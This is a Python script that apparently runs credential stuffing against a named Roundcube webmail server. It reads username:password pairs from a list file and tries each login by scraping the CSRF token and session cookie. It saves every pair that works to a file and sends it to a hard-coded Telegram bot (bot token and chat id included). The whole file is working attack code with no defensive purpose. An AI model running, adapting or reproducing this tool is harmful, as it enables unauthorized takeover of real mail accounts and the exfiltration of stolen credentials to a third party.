import requests
import re
def find(text, start_str, end_str):
    pattern = re.escape(start_str) + r'(.*?)' + re.escape(end_str)
    matches = re.findall(pattern, text, re.DOTALL)
    return matches



headers_simple={

	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',

	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
}




llist = open('list.txt','r')

log = llist.read().splitlines()

llist.close()


Welcome = "https://api.telegram.org/bot6470432885:AAGibBcoBcRvRKkVBBzho1JybjK7D6xjdC4/sendMessage?chat_id=5958344186&text="+"dream.jp starting---"
WelcomeReq = requests.get(Welcome)


for i in range(0,len(log)):

	if (len(log[i].split(':'))==2):
		username = log[i].split(':')[0]
		password = log[i].split(':')[1]


		

			


		r1 = requests.get("https://newwebmail1.mailme.dk/roundcube-1.4/?_task=mail",headers=headers_simple,allow_redirects=False)

		response1=str(r1.text.encode("utf-8").strip())

		token = find(response1,'''token" value="''','''">''')[0]



		r1cookie = r1.headers['Set-Cookie']


		cookie_token_name = r1cookie.split(";")[0].split("=")[0]
		cookie_token_value = r1cookie.split(";")[0].split("=")[1]


		data = { 
		'_token':token,
		'_task':'login',
		'_action':'login',
		'_timezone':'_default_',
		'_url':'',
		'_user':username,
		'_pass':password
		}


		cookies = {

			cookie_token_name : cookie_token_value , 


		}

		r2 = requests.Session()


		r2 = requests.post("https://newwebmail1.mailme.dk/roundcube-1.4/?_task=login",allow_redirects=False,headers=headers_simple,data=data,cookies=cookies)

		
		cookie_set = str(r2.headers['Set-Cookie'])
		

		
		
		if ("roundcube_sessid" in cookie_set):

			
			print("login work")
			rez = open("valid.txt","a")

			xlog =str(log[i])+"\n"
			linkk = "https://api.telegram.org/bot6470432885:AAGibBcoBcRvRKkVBBzho1JybjK7D6xjdC4/sendMessage?chat_id=5958344186&text="+xlog
			p = requests.get(linkk)
			rez.write(xlog)
			rez.close()
		else:
			print("login not work")

		# except:
		# 	print("connexion problems")

	else:
		print("login invalid")









